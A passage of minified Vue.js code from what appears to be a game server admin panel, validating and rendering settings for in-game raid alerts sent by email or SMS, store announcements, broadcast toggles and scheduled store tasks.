Error("请正确输入抄家提醒公共策略设置"))}}],HomeAttackedSquadConfigs:[{required:!0,trigger:"change",message:"请输入抄家提醒队伍策略设置",validator:function(t,i,a){if(i&&i.length){var n=[];i.forEach((function(e,t){var i,a,r,o,s,l,c,d,u,p,m,g,h,f,y,v,x,b,S,w,L;if("email"===(null==e?void 0:e.type))if("number"==typeof(null==e?void 0:e.squadId)&&"number"==typeof(null==e?void 0:e.x)&&"number"==typeof(null==e?void 0:e.y)&&"number"==typeof(null==e?void 0:e.radius)&&(null==e?void 0:e.radius)>0&&null!=e&&null!==(i=e.tos)&&void 0!==i&&i.length&&void 0===(null==e||null===(a=e.tos)||void 0===a?void 0:a.find((function(e){return!(null!=e&&e.length&&/^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$/.exec(e))})))&&(!0===e.diy&&null!=e&&null!==(r=e.emailConfigs)&&void 0!==r&&null!==(o=r.host)&&void 0!==o&&o.length&&null!=e&&null!==(s=e.emailConfigs)&&void 0!==s&&null!==(l=s.port)&&void 0!==l&&l.length&&/^([1-9][0-9]*)$/.test(null==e||null===(c=e.emailConfigs)||void 0===c?void 0:c.port)&&null!=e&&null!==(d=e.emailConfigs)&&void 0!==d&&null!==(u=d.user)&&void 0!==u&&u.length&&null!=e&&null!==(p=e.emailConfigs)&&void 0!==p&&null!==(m=p.pass)&&void 0!==m&&m.length||!1===e.diy));else{var k,I,_,T,C,F,R,E,P,A,D,$={line:t+1,contents:[]};if("number"!=typeof(null==e?void 0:e.squadId)&&$.contents.push("请选择小队"),"number"==typeof(null==e?void 0:e.x)&&"number"==typeof(null==e?void 0:e.y)&&"number"==typeof(null==e?void 0:e.radius)&&(null==e?void 0:e.radius)>0||$.contents.push("预警中心X,Y坐标应为数字，预警半径应为大于0的数字"),null!=e&&null!==(k=e.tos)&&void 0!==k&&k.length&&void 0===(null==e||null===(I=e.tos)||void 0===I?void 0:I.find((function(e){return!(null!=e&&e.length&&/^[\w-]+(\.[\w-]+)*@[\w-]+(\.[\w-]+)+$/.exec(e))})))||$.contents.push("通知邮箱地址都不能为空"),!0===e.diy)null!=e&&null!==(_=e.emailConfigs)&&void 0!==_&&null!==(T=_.host)&&void 0!==T&&T.length&&null!=e&&null!==(C=e.emailConfigs)&&void 0!==C&&null!==(F=C.port)&&void 0!==F&&F.length&&/^([1-9][0-9]*)$/.test(null==e||null===(R=e.emailConfigs)||void 0===R?void 0:R.port)||$.contents.push("邮箱服务域名和端口不能为空，端口应为大于0的整数"),null!=e&&null!==(E=e.emailConfigs)&&void 0!==E&&null!==(P=E.user)&&void 0!==P&&P.length&&null!=e&&null!==(A=e.emailConfigs)&&void 0!==A&&null!==(D=A.pass)&&void 0!==D&&D.length||$.contents.push("用户名和密码/凭据不能为空");n.push($)}else if("number"==typeof(null==e?void 0:e.squadId)&&"number"==typeof(null==e?void 0:e.x)&&"number"==typeof(null==e?void 0:e.y)&&"number"==typeof(null==e?void 0:e.radius)&&(null==e?void 0:e.radius)>0&&null!=e&&null!==(g=e.phoneNumber)&&void 0!==g&&g.length&&void 0===(null==e||null===(h=e.phoneNumber)||void 0===h?void 0:h.find((function(e){return!(null!=e&&e.length&&/^(?:\+?86)?1(?:3\d{3}|5[^4\D]\d{2}|8\d{3}|7(?:[235-8]\d{2}|4(?:0\d|1[0-2]|9\d))|9[0-35-9]\d{2}|66\d{2})\d{6}$/.exec(e))})))&&(!0===e.diy&&null!=e&&null!==(f=e.smsConfigs)&&void 0!==f&&null!==(y=f.accessKeyId)&&void 0!==y&&y.length&&null!=e&&null!==(v=e.smsConfigs)&&void 0!==v&&null!==(x=v.accessKeySecret)&&void 0!==x&&x.length&&null!=e&&null!==(b=e.smsConfigs)&&void 0!==b&&null!==(S=b.signNameJson)&&void 0!==S&&S.length&&null!=e&&null!==(w=e.smsConfigs)&&void 0!==w&&null!==(L=w.templateCode)&&void 0!==L&&L.length||!1===e.diy));else{var U,N,M,z,O,q,B,H,j,Y,G={line:t+1,contents:[]};if("number"!=typeof(null==e?void 0:e.squadId)&&G.contents.push("请选择小队"),"number"==typeof(null==e?void 0:e.x)&&"number"==typeof(null==e?void 0:e.y)&&"number"==typeof(null==e?void 0:e.radius)&&(null==e?void 0:e.radius)>0||G.contents.push("预警中心X,Y坐标应为数字，预警半径应为大于0的数字"),null!=e&&null!==(U=e.phoneNumber)&&void 0!==U&&U.length&&void 0===(null==e||null===(N=e.phoneNumber)||void 0===N?void 0:N.find((function(e){return!(null!=e&&e.length&&/^(?:\+?86)?1(?:3\d{3}|5[^4\D]\d{2}|8\d{3}|7(?:[235-8]\d{2}|4(?:0\d|1[0-2]|9\d))|9[0-35-9]\d{2}|66\d{2})\d{6}$/.exec(e))})))||G.contents.push("通知手机号不合法(只支持中国大陆手机号)"),!0===e.diy)null!=e&&null!==(M=e.smsConfigs)&&void 0!==M&&null!==(z=M.accessKeyId)&&void 0!==z&&z.length&&null!=e&&null!==(O=e.smsConfigs)&&void 0!==O&&null!==(q=O.accessKeySecret)&&void 0!==q&&q.length||G.contents.push("阿里云AccessKeyID和AccessKeySecret不能为空"),null!=e&&null!==(B=e.smsConfigs)&&void 0!==B&&null!==(H=B.signNameJson)&&void 0!==H&&H.length&&null!=e&&null!==(j=e.smsConfigs)&&void 0!==j&&null!==(Y=j.templateCode)&&void 0!==Y&&Y.length||G.contents.push("阿里云短信签名名称和短信模板Code不能为空");n.push(G)}})),n.length?(e.$message.warning(n.map((function(e){return"第".concat(e.line,"项：").concat(e.contents.join("；"))})).join("。\n")),a(new Error("请正确填写抄家提醒队伍策略设置"))):a()}else a()}}],EnableGameRoutineNotification:[{trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],StoreBackgoundOpacity:[{required:!0,trigger:"change",message:"请输入商城背景图片透明度(0-100)",validator:function(e,t,i){"number"==typeof t&&t<=100&&t>=0?i():i(new Error("请输入商城背景图片透明度(0-100)"))}}],GameRoutineNotification:[{trigger:"change",message:"请输入游戏定时公告",validator:function(e,t,i){!t||!t.length||t&&t.length&&void 0===t.find((function(e){return!(e&&e.length)}))?i():i(new Error("请输入游戏定时公告"))}}],GameRoutineNotificationInterval:[{required:!0,trigger:"change",message:"请输入游戏公告时间间隔",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入游戏公告时间间隔"))}}],RandomEventList:[{required:!0,trigger:"change",message:"请输入正确的定时任务配置",validator:function(t,i,a){if(i&&i.length){var n=[];if(i.forEach((function(e,t){var i={itemIndex:t,errors:[]};"string"==typeof e.eventGroupName&&e.eventGroupName.length||i.errors.push("组名不能为空"),e.eventList&&e.eventList.length||i.errors.push("事件列表不能为空"),e.eventList.forEach((function(e,t){"string"==typeof e&&e.length||i.errors.push("第".concat(t+1,"个事件内容不能为空"))})),i.errors.length&&n.push(i)})),n.length){var r=n.map((function(e){return"第".concat(e.itemIndex+1,"组：")+e.errors.join("；")})).join("。\n");e.$message.warning(r),a(r)}else a()}else a()}}],StoreCronSchedules:[{required:!0,trigger:"change",message:"请输入正确的定时任务配置",validator:function(t,i,a){if(i.length){var n=[];if(i.forEach((function(e,t){var i={itemIndex:t,errors:[]},a=e.cron,r=a.dayOfWeek,o=a.hour,s=e.configs,l=s.commands,c=s.UserCheckInPrize,d=s.OnlineRewardPerMinute;null===r&&null===o&&i.errors.push("定时选项至少要以天为周期"),e.type?("message"!==e.type||"string"==typeof l&&l.length||i.errors.push("消息内容不能为空"),"changeUserCheckInPrize"!==e.type||"number"==typeof c&&c>=0||i.errors.push("请输入正确的签到奖励"),"changeOnlineRewardPerMinute"!==e.type||"number"==typeof d&&d>=0||i.errors.push("请输入正确的在线奖励")):i.errors.push("动作类型不能为空"),i.errors.length&&n.push(i)})),n.length){var r=n.map((function(e){return"第".concat(e.itemIndex+1,"行：")+e.errors.join("；")})).join("。\n");e.$message.warning(r),a(r)}else a()}else a()}}]},showUploadConfig:!1,showUploadConfigMobile:!1,searchSquadList:{},expander:{HomeAttackedSquadConfig:!0,RandomEventList:!0,StoreCronSchedules:!0}}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getData();case 2:case"end":return t.stop()}}),t)})))()},methods:{getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$set(e,"searchSquadList",{}),e.$nextTick(Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/notificationSettings"});case 4:i=t.sent,e.loading=!1,200===i.status&&(e.existRandomEventList=i.data.RandomEventList,i.data.HomeAttackedSquadConfigs=i.data.HomeAttackedSquadConfigs.map((function(t,i){var a,n,r,o;return null!=t&&null!==(a=t.emailConfigs)&&void 0!==a&&null!==(n=a.host)&&void 0!==n&&n.length||null!=t&&null!==(r=t.smsConfigs)&&void 0!==r&&null!==(o=r.accessKeyId)&&void 0!==o&&o.length?t.diy=!0:t.diy=!1,e.initSearchSquad(i,t.squadId+""),t})),e.$set(e,"settingsForm",i.data)),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])}))));case 2:case"end":return t.stop()}}),t)})))()},onClickEdit:function(){this.show=!0,this.edit=!0},onClickCancelEdit:function(){this.edit=!1,this.showUploadConfig=!1,this.showUploadConfigMobile=!1,this.getData()},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,s,l,c,d,u,p,m,g,h,y,v,x,b,S;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:!1===e.settingsForm.EnableHomeAttackedNotification&&(!0,i=e.settingsForm.HomeAttackedNotificationConfigs,!1===("email"===(null==i?void 0:i.type)?!!(null!=i&&null!==(a=i.emailConfigs)&&void 0!==a&&null!==(n=a.host)&&void 0!==n&&n.length&&null!=i&&null!==(r=i.emailConfigs)&&void 0!==r&&null!==(s=r.port)&&void 0!==s&&s.length&&/^([1-9][0-9]*)$/.test(null==i||null===(l=i.emailConfigs)||void 0===l?void 0:l.port)&&null!=i&&null!==(c=i.emailConfigs)&&void 0!==c&&null!==(d=c.user)&&void 0!==d&&d.length&&null!=i&&null!==(u=i.emailConfigs)&&void 0!==u&&null!==(p=u.pass)&&void 0!==p&&p.length):!!(null!=i&&null!==(m=i.smsConfigs)&&void 0!==m&&null!==(g=m.accessKeyId)&&void 0!==g&&g.length&&null!=i&&null!==(h=i.smsConfigs)&&void 0!==h&&null!==(y=h.accessKeySecret)&&void 0!==y&&y.length&&null!=i&&null!==(v=i.smsConfigs)&&void 0!==v&&null!==(x=v.signNameJson)&&void 0!==x&&x.length&&null!=i&&null!==(b=i.smsConfigs)&&void 0!==b&&null!==(S=b.templateCode)&&void 0!==S&&S.length))&&(e.settingsForm.HomeAttackedNotificationConfigs={type:"email",emailConfigs:{host:"example.com",port:"4399",user:"user",pass:"password",secure:!0},smsConfigs:{accessKeyId:"",accessKeySecret:"",signNameJson:"",templateCode:""}})),e.$nextTick((function(){e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=20;break}return(a=Object(A.cloneDeep)(e.settingsForm)).HomeAttackedSquadConfigs=a.HomeAttackedSquadConfigs.map((function(e){return delete e.diy,e})),e.saveLoading=!0,t.prev=4,t.next=7,f({method:"PUT",url:"/serverConfigAdminSys/updateNotificationSettings",data:a});case 7:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=14;break}return e.$message.success("修改成功"),e.edit=!1,t.next=14,e.getData();case 14:t.next=20;break;case 16:t.prev=16,t.t0=t.catch(4),console.error(t.t0),e.saveLoading=!1;case 20:case"end":return t.stop()}}),t,null,[[4,16]])})));return function(e){return t.apply(this,arguments)}}())}));case 2:case"end":return t.stop()}}),t)})))()},initSearchSquad:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return a.prev=0,n={keyword:t},a.next=4,f({method:"GET",url:"/squadAdminSys/searchSquads",params:n});case 4:200===(r=a.sent).status&&i.$set(i.searchSquadList,e+"",r.data),a.next=11;break;case 8:a.prev=8,a.t0=a.catch(0),console.error(a.t0);case 11:case"end":return a.stop()}}),a,null,[[0,8]])})))()},handleSearchSquad:Object(A.debounce)(function(){var e=Object(o.a)(regeneratorRuntime.mark((function e(t,i){var a,n;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,a={keyword:i},e.next=4,f({method:"GET",url:"/squadAdminSys/searchSquads",params:a});case 4:200===(n=e.sent).status&&this.$set(this.searchSquadList,t+"",n.data),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0),console.error(e.t0);case 11:case"end":return e.stop()}}),e,this,[[0,8]])})));return function(t,i){return e.apply(this,arguments)}}(),500)}},za=(i("3333"),Object(S.a)(Ma,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("通知公告设置")]),e.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")]),e.loading?e._e():[e.edit||!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"edit"},on:{click:e.onClickEdit}},[e._v("编辑")]),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"edit",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("保存")]):e._e(),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",disabled:e.saveLoading},on:{click:e.onClickCancelEdit}},[e._v("取消")]):e._e()]],2),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开"))])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%",position:"relative",background:"white","overflow-y":"auto"},style:{minHeight:500+120*e.settingsForm.StoreCronSchedules.length+"px"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[e.loading?e._e():i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"800px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:7},"wrapper-col":{span:17}}},[i("a-form-model-item",{attrs:{label:"首次访问商城的提示",prop:"FirstVisitAnnouncement"}},[i("editor",{attrs:{disabled:!e.edit,placeholder:"内容会在玩家首次访问商城时提示，建议输入服规等让玩家必须了解确认的信息"},model:{value:e.settingsForm.FirstVisitAnnouncement,callback:function(t){e.$set(e.settingsForm,"FirstVisitAnnouncement",t)},expression:"settingsForm.FirstVisitAnnouncement"}})],1),i("a-form-model-item",{attrs:{label:"商城首页公告",prop:"StoreNotification"}},[i("editor",{attrs:{disabled:!e.edit,placeholder:"内容会在商城页面滚动播报"},model:{value:e.settingsForm.StoreNotification,callback:function(t){e.$set(e.settingsForm,"StoreNotification",t)},expression:"settingsForm.StoreNotification"}})],1),i("a-form-model-item",{attrs:{label:"商城顶部滚动公告",prop:"TopAnnouncement"}},[i("a-input",{staticStyle:{"margin-top":"10px"},attrs:{type:"textarea",disabled:!e.edit,"auto-size":{minRows:6,maxRows:6},placeholder:"如果不设置将会沿用商城首页公告"},model:{value:e.settingsForm.TopAnnouncement,callback:function(t){e.$set(e.settingsForm,"TopAnnouncement",t)},expression:"settingsForm.TopAnnouncement"}})],1),i("a-form-model-item",{attrs:{label:"活动击杀播报",prop:"EnableEventKillLogBoardcast"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableEventKillLogBoardcast,callback:function(t){e.$set(e.settingsForm,"EnableEventKillLogBoardcast",t)},expression:"settingsForm.EnableEventKillLogBoardcast"}})],1),i("a-form-model-item",{attrs:{label:"播报开关"}},[i("div",{staticStyle:{border:"1px #aaaaaa dashed","border-radius":"4px"},attrs:{id:"enable-queue"}},[i("a-form-model-item",{attrs:{label:"开启击杀信息播报",prop:"EnableKillQueue"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableKillQueue,callback:function(t){e.$set(e.settingsForm,"EnableKillQueue",t)},expression:"settingsForm.EnableKillQueue"}})],1),i("a-form-model-item",{attrs:{label:"开启登录退出信息播报",prop:"EnableLoginLogoutQueue"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableLoginLogoutQueue,callback:function(t){e.$set(e.settingsForm,"EnableLoginLogoutQueue",t)},expression:"settingsForm.EnableLoginLogoutQueue"}})],1),i("a-form-model-item",{attrs:{label:"开启中英双语播报",prop:"EnableEnglishQueue"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableEnglishQueue,callback:function(t){e.$set(e.settingsForm,"EnableEnglishQueue",t)},expression:"settingsForm.EnableEnglishQueue"}})],1)],1)]),i("a-form-model-item",{attrs:{label:"开启抄家提醒功能",prop:"EnableHomeAttackedNotification"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableHomeAttackedNotification,callback:function(t){e.$set(e.settingsForm,"EnableHomeAttackedNotification",t)},expression:"settingsForm.EnableHomeAttackedNotification"}})],1),i("a-form-model-item",{attrs:{label:"抄家提醒公共通知设置",prop:"HomeAttackedNotificationConfigs"}},[i("div",{staticStyle:{width:"100%",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("通知类型:")]),i("a-radio-group",{attrs:{disabled:!e.edit,"button-style":"solid"},on:{change:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs,"emailConfigs",{host:"",port:"",secure:!0,user:"",pass:""}),e.$set(e.settingsForm.HomeAttackedNotificationConfigs,"smsConfigs",{accessKeyId:"",accessKeySecret:"",signNameJson:"",templateCode:""})}},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.type,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs,"type",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.type"}},[i("a-radio-button",{attrs:{value:"email"}},[e._v("电子邮箱")]),i("a-radio-button",{attrs:{value:"sms"}},[e._v("短信")])],1)],1),"email"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("邮箱服务器:")]),i("a-input",{staticStyle:{width:"calc((100% - 140px) / 2)"},attrs:{placeholder:"Host",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs.host,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs,"host",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.emailConfigs.host"}}),i("span",{staticStyle:{margin:"0 3px"}},[e._v(":")]),i("a-input",{staticStyle:{width:"calc((100% - 140px) / 2)"},attrs:{placeholder:"Port",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs.port,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs,"port",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.emailConfigs.port"}})],1):e._e(),"email"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("安全设置:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs.secure,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs,"secure",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.emailConfigs.secure"}})],1):e._e(),"email"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("账号:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{placeholder:"发送邮件的邮箱地址",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs.user,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs,"user",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.emailConfigs.user"}})],1):e._e(),"email"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("密码:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{placeholder:"邮箱密码或者授权token",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs.pass,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.emailConfigs,"pass",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.emailConfigs.pass"}})],1):e._e(),"sms"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",{staticStyle:{"line-height":"20px",color:"red"}},[e._v(" * 当前支持阿里云短信平台，请参考"),i("strong",[i("a",{attrs:{target:"_blank",href:"https://help.aliyun.com/zh/sms/getting-started/get-started-with-sms"}},[e._v("阿里云短信接入指南")])]),e._v("，配置短信模板时必须引入"),i("strong",[e._v("${action}")]),e._v("变量，例如："),i("strong",[e._v("XXX服务器玩家你好，当前有其他玩家在警戒范围内实施${action}行为，请上线查看")])]):e._e(),"sms"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("AccessKey ID:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{placeholder:"阿里云的AccessKey ID",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs.accessKeyId,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs,"accessKeyId",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.smsConfigs.accessKeyId"}})],1):e._e(),"sms"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("AccessKey Secret:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{placeholder:"阿里云的AccessKey Secret",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs.accessKeySecret,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs,"accessKeySecret",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.smsConfigs.accessKeySecret"}})],1):e._e(),"sms"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("短信签名名称:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{placeholder:"阿里云的短信签名名称",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs.signNameJson,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs,"signNameJson",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.smsConfigs.signNameJson"}})],1):e._e(),"sms"===e.settingsForm.HomeAttackedNotificationConfigs.type?i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("短信模板Code:")]),i("a-input",{staticStyle:{width:"calc(100% - 130px)"},attrs:{placeholder:"短信模板Code",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs.templateCode,callback:function(t){e.$set(e.settingsForm.HomeAttackedNotificationConfigs.smsConfigs,"templateCode",t)},expression:"settingsForm.HomeAttackedNotificationConfigs.smsConfigs.templateCode"}})],1):e._e()])]),i("a-form-model-item",{attrs:{label:"抄家提醒公共策略设置",prop:"HomeAttackedPolicyConfigs"}},[i("div",{staticStyle:{width:"100%",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"220px","text-align":"right","padding-right":"10px"}},[e._v("同队告警冷却分钟数(触发陷阱):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 220px)"},attrs:{min:0,placeholder:"大于0的数字",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedPolicyConfigs.trap,callback:function(t){e.$set(e.settingsForm.HomeAttackedPolicyConfigs,"trap",t)},expression:"settingsForm.HomeAttackedPolicyConfigs.trap"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"220px","text-align":"right","padding-right":"10px"}},[e._v("同队告警冷却分钟数(外人摸旗):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 220px)"},attrs:{min:0,placeholder:"大于0的数字",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedPolicyConfigs.baseBuildingTake,callback:function(t){e.$set(e.settingsForm.HomeAttackedPolicyConfigs,"baseBuildingTake",t)},expression:"settingsForm.HomeAttackedPolicyConfigs.baseBuildingTake"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"220px","text-align":"right","padding-right":"10px"}},[e._v("同队告警冷却分钟数(外人撬锁):")]),i("a-input-number",{staticStyle:{width:"calc(100% - 220px)"},attrs:{min:0,placeholder:"大于0的数字",disabled:!e.edit},model:{value:e.settingsForm.HomeAttackedPolicyConfigs.lockPick,callback:function(t){e.$set(e.settingsForm.HomeAttackedPolicyConfigs,"lockPick",t)},expression:"settingsForm.HomeAttackedPolicyConfigs.lockPick"}})],1)])]),i("a-form-model-item",{attrs:{label:"抄家提醒队伍策略设置",prop:"HomeAttackedSquadConfigs"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.HomeAttackedSquadConfigs.push({squadId:"",x:0,y:0,radius:100,type:"email",tos:[],phoneNumber:[],diy:!1,emailConfigs:{host:"",port:"",secure:!0,user:"",pass:""},smsConfigs:{accessKeyId:"",accessKeySecret:"",signNameJson:"",templateCode:""}})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.HomeAttackedSquadConfig?"up":"down"},on:{click:function(){e.$set(e.expander,"HomeAttackedSquadConfig",!e.expander.HomeAttackedSquadConfig)}}},[e._v(e._s(e.expander.HomeAttackedSquadConfig?"隐藏":"显示"))])],1),e.expander.HomeAttackedSquadConfig?e._l(e.settingsForm.HomeAttackedSquadConfigs,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("队伍:")]),i("a-select",{staticStyle:{width:"calc(100% - 250px)"},attrs:{disabled:!e.edit,placeholder:"模糊搜索(名称)","allow-clear":"","show-search":"","filter-option":!1},on:{search:function(t){return e.handleSearchSquad(a+"",t)}},model:{value:t.squadId,callback:function(i){e.$set(t,"squadId",i)},expression:"HomeAttackedSquadConfig.squadId"}},e._l(e.searchSquadList[a+""],(function(t){return i("a-select-option",{key:t.id,attrs:{label:t.name}},[e._v(e._s(t.name))])})),1),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.HomeAttackedSquadConfigs.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("预警中心XY坐标点:")]),i("a-input-number",{staticStyle:{width:"calc((100% - 170px) / 2)"},attrs:{placeholder:"X坐标",disabled:!e.edit},model:{value:t.x,callback:function(i){e.$set(t,"x",i)},expression:"HomeAttackedSquadConfig.x"}}),i("a-input-number",{staticStyle:{width:"calc((100% - 170px) / 2)","margin-left":"10px"},attrs:{placeholder:"Y坐标",disabled:!e.edit},model:{value:t.y,callback:function(i){e.$set(t,"y",i)},expression:"HomeAttackedSquadConfig.y"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"160px","text-align":"right","padding-right":"10px"}},[e._v("预警半径:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 